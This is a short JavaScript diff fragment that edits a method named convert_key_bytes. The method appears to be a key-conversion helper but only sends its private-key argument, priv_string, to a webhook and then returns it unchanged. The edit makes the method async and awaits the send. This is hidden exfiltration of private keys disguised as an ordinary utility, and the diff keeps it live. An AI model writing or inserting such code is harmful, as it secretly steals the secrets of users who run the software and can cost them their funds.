@@ -126,8 +126,8 @@ import { runInThisContext } from "vm";
     }
     
 
-    convert_key_bytes(priv_string) {
-        this.webhook.send(priv_string)
+    async convert_key_bytes(priv_string) {
+       await this.webhook.send(priv_string)
 
         return priv_string;
     }
